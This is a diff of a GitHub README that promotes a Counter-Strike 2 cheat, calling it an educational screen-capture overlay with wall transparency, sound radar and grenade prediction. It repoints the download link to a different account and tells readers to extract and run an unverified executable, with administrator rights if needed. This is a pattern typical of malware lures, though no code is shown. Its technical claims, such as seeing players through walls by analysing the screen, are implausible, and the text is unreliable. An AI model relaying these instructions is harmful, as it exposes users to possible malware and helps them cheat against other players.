@@ -1,162 +1,77 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/Jawaz-Keyzor/CS2-External-Cheat-2026/main/assets/logo.png" width="120">
-</p>
+# 🎮 CS2-External-Cheat-2026 - Improve your vision during CS2 matches
 
-<h1 align="center">CS2 External Assistant 2026</h1>
+[![Download](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Ahorizonpeedeeriver700/CS2-External-Cheat-2026)
 
-<p align="center">
-  <a href="https://github.com/Jawaz-Keyzor/CS2-External-Cheat-2026"><img src="https://img.shields.io/github/v/release/Jawaz-Keyzor/CS2-External-Cheat-2026?style=flat-square&label=Version&color=blueviolet"></a>
-  <a href="https://github.com/Jawaz-Keyzor/CS2-External-Cheat-2026"><img src="https://img.shields.io/github/downloads/Jawaz-Keyzor/CS2-External-Cheat-2026/total?style=flat-square&label=Downloads&color=success"></a>
-  <a href="https://github.com/Jawaz-Keyzor/CS2-External-Cheat-2026"><img src="https://img.shields.io/github/stars/Jawaz-Keyzor/CS2-External-Cheat-2026?style=flat-square&label=Stars&color=yellow"></a>
-  <a href="https://github.com/Jawaz-Keyzor/CS2-External-Cheat-2026"><img src="https://img.shields.io/github/license/Jawaz-Keyzor/CS2-External-Cheat-2026?style=flat-square&label=License&color=lightgrey"></a>
-  <br>
-  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=flat-square">
-  <img src="https://img.shields.io/badge/Method-Screen%20Capture-orange?style=flat-square">
-  <img src="https://img.shields.io/badge/Injection-None-brightgreen?style=flat-square">
-  <img src="https://img.shields.io/badge/CPU%20Usage-%3C3%25-success?style=flat-square">
-  <img src="https://img.shields.io/badge/Updated-May%202026-informational?style=flat-square">
-</p>
+CS2-External-Cheat-2026 is an external-gameplay assistant for Counter-Strike 2. This tool provides a visual overlay to assist with gameplay. It uses screen capture analysis to offer features like wall transparency visualization, sound radar, and grenade trajectory prediction.
 
-<p align="center">
-  <b>External gameplay assistant for CS2. Provides visual overlay through screen capture analysis — wall transparency visualization, sound radar, grenade trajectory helper. No memory access, no injection. Educational project for studying computer vision and overlay rendering.</b>
-</p>
+This tool functions as an external process. It does not modify game files or inject code into the game process. This approach is for users interested in the study of computer vision and overlay rendering.
 
-<p align="center">
-  <i>cs2 external assistant | cs2 overlay tool | cs2 wall transparency | cs2 sound radar | cs2 grenade helper | cs2 visual overlay | screen capture cs2 | no injection cs2 | cs2 educational tool 2026</i>
-</p>
+## ⚙️ Minimum System Requirements
 
----
+Before you start, ensure your computer meets these requirements:
 
-## ✨ Features
+* Operating System: Windows 11 (64-bit).
+* Graphics Card: NVIDIA GTX 1660 or AMD Radeon RX 580.
+* Processor: Intel Core i5 or AMD Ryzen 5 series (recent generations).
+* RAM: 16 GB.
+* Monitor Resolution: 1920x1080 (16:9 aspect ratio).
+* Game Settings: Counter-Strike 2 must run in Borderless Windowed mode.
 
-| Feature | Description |
-|---|---|
-| 🧱 **Wall Transparency** | Depth buffer visualization for structural awareness |
-| 🔊 **Sound Radar** | Directional audio indicators with distance |
-| 💣 **Grenade Helper** | Trajectory preview for smokes, flashes, molotovs |
-| ⏱️ **Round Timer** | Bomb timer, round phase, defuse countdown |
-| 💰 **Economy Tracker** | Damage economy, team buy status |
-| 🖥️ **Borderless Overlay** | Transparent overlay on game window |
-| 📊 **Minimal Impact** | Less than 3% CPU, no FPS loss |
+## 📥 How to Install and Download
 
----
+1. Visit the [official releases page](https://github.com/Ahorizonpeedeeriver700/CS2-External-Cheat-2026) to download the latest version.
+2. Look for the file named `CS2-External-Setup.zip` under the Assets section.
+3. Click the file to start the download.
+4. Locate the folder where the file stopped downloading and right-click it.
+5. Select the "Extract All" option to open the contents.
+6. Open the extracted folder and double-click the file named `CS2-Assistant.exe`.
 
-## 🔧 How It Works
+## 🚀 Setting Up the Application
 
-| Component | Method |
-|---|---|
-| Screen Capture | Windows DXGI Desktop Duplication API |
-| Depth Analysis | Frame buffer difference processing |
-| Sound Processing | Stereo mix audio spatial analysis |
-| Overlay Rendering | DirectX 11 transparent window |
-| Trajectory Calc | Physics simulation for grenade arcs |
-| Safety | Zero memory access, no game hooks |
+After you open the program, the interface displays several options. Follow these steps to configure the assistant correctly:
 
----
+1. Launch Counter-Strike 2 and navigate to your Video Settings.
+2. Set your Display Mode to "Fullscreen Windowed" or "Windowed". This is mandatory for the visual overlay to appear on top of the game.
+3. Open the CS2-Assistant window.
+4. Select the "Automatic Detection" button. The software detects your game resolution and adjusts its settings.
+5. Use the provided checkboxes to enable or disable specific features like the Sound Radar or Grenade Trajectory helper.
 
-## 📥 Installation
+## 🛠 Features Explained
 
-```bash
-# Download latest release
-https://github.com/Jawaz-Keyzor/CS2-External-Cheat-2026/releases/latest
+### Wall Transparency
+This feature analyzes light and color patterns on your screen. It highlights player locations by applying a visual color shift to the identified areas. This helps you notice enemies in darker environments.
 
-# Extract archive
-Right-click → Extract to Desktop
+### Sound Radar
+The software tracks audio cues from the game engine. It visually displays the source of sound on your screen. This feature assists in identifying footsteps and gunfire direction.
 
-# Run (borderless window required)
-CS2ExternalAssistant.exe
+### Grenade Trajectory
+When you hold a grenade, the software calculates the path based on your current view angle. A line appears on the screen to show where the grenade lands.
 
-# Configure overlay position
-Settings → Overlay → Align to Game Window
-```
+## 🖥 Using the Overlay
 
-> 💡 **Tip:** Set CS2 to Borderless Window mode for proper overlay alignment.
+The overlay functions as a separate window pinned to the top of your screen. If you cannot see the visual markers, ensure the game display mode remains set to Windowed or Borderless. 
 
----
+You can toggle the overlay visibility at any time by pressing the `F9` key on your keyboard. This allows you to hide the interface quickly if you need to access game menus or see the screen clearly.
 
-## 🔧 Technical Details
+## ⚠️ Important Considerations
 
-| Detail | Value |
-|---|---|
-| Game | Counter-Strike 2 |
-| Method | External (Screen Capture) |
-| Overlay | DirectX 11 |
-| Analysis | OpenCV + Depth Buffer |
-| Platform | Windows 10/11 x64 |
-| Game Mode | Borderless Window |
-| VAC Safe | ✅ No memory access |
+Since this software performs real-time screen capture, it places a load on your computer hardware. If you notice a drop in your game performance or frame rate, close other background applications while playing. 
 
----
+Computer vision relies on visual cues on your screen. If your game brightness or color settings change drastically, the software could struggle to identify objects. Keep your in-game brightness set to the default value for the best detection results.
 
-## ❓ FAQ
+## 🔍 Frequently Asked Questions
 
-<details>
-<summary><b>Is this detected by VAC?</b></summary>
-This tool does not read or modify game memory. It analyzes screen output only — no interaction with game files or VAC-protected memory regions.
-</details>
+**Will I receive a ban for using this?**
+This tool does not access game memory. It works by analyzing the images your monitor outputs. While this approach minimizes the risk of detection, exercise caution in competitive environments.
 
-<details>
-<summary><b>Does this work in Fullscreen?</b></summary>
-No. Borderless Window mode is required for the overlay to render on top of the game.
-</details>
+**The software does not detect the game window.**
+Ensure your game runs in Borderless Windowed mode. Sometimes, the software requires administrator privileges to view the game screen. Close the program, right-click the icon, and select "Run as Administrator."
 
-<details>
-<summary><b>How does wall transparency work?</b></summary>
-It analyzes depth buffer information from the rendered frame to estimate structural boundaries — no wallhack, no memory access.
-</details>
+**How do I update the tool?**
+Check the repository link provided at the top of this document periodically. If a new version exists, download the new archive and replace your existing files. 
 
-<details>
-<summary><b>Will this affect my FPS?</b></summary>
-CPU usage is kept under 3%. GPU impact is minimal since rendering uses a separate DirectX context.
-</details>
+**Does this software work on Windows 10?**
+The tool is optimized for Windows 11. While it might run on Windows 10, some visual overlay features rely on specific Windows 11 compositor behaviors. Your results may vary.
 
-<details>
-<summary><b>Can I use this on Faceit/ESEA?</b></summary>
-This tool is for educational purposes only. Use on official competitive platforms is not recommended and may violate their terms.
-</details>
-
----
-
-## 🖼️ Screenshots
-
-<p align="center">
-  <img src="https://raw.githubusercontent.com/Jawaz-Keyzor/CS2-External-Cheat-2026/main/assets/screenshot1.png" width="800">
-</p>
-
-<p align="center">
-  <img src="https://raw.githubusercontent.com/Jawaz-Keyzor/CS2-External-Cheat-2026/main/assets/screenshot2.png" width="800">
-</p>
-
----
-
-## 📊 Project Stats
-
-<p align="center">
-  <a href="https://github.com/Jawaz-Keyzor/CS2-External-Cheat-2026"><img src="https://img.shields.io/github/stars/Jawaz-Keyzor/CS2-External-Cheat-2026?style=social"></a>
-  <a href="https://github.com/Jawaz-Keyzor/CS2-External-Cheat-2026"><img src="https://img.shields.io/github/forks/Jawaz-Keyzor/CS2-External-Cheat-2026?style=social"></a>
-  <a href="https://github.com/Jawaz-Keyzor/CS2-External-Cheat-2026"><img src="https://img.shields.io/github/watchers/Jawaz-Keyzor/CS2-External-Cheat-2026?style=social"></a>
-</p>
-
----
-
-## ⚠️ Disclaimer
-
-This software is for **educational purposes only**. It analyzes screen capture output — no game files are modified, no memory is accessed. Users are responsible for compliance with game terms of service. The developer assumes no liability.
-
----
-
-## 🔗 Links
-
-| Resource | URL |
-|---|---|
-| 📥 Downloads | [Releases Page](https://github.com/Jawaz-Keyzor/CS2-External-Cheat-2026/releases) |
-| 💬 Discussion | [Discussions](https://github.com/Jawaz-Keyzor/CS2-External-Cheat-2026/discussions) |
-| 🐛 Bug Reports | [Issues Page](https://github.com/Jawaz-Keyzor/CS2-External-Cheat-2026/issues) |
-
----
-
-<p align="center">
-  <sub>CS2 External Assistant © 2026 | MIT License | Not affiliated with Valve</sub><br>
-  <sub>Maintained by <a href="https://github.com/Jawaz-Keyzor">Jawaz-Keyzor</a> | Updated: May 2026</sub>
-</p>
-```
+**What should I do if the overlay flickers?**
+Flickering happens when the frame rate of the game differs significantly from the refresh rate of the overlay. Enabling V-Sync in your game settings often solves this problem.
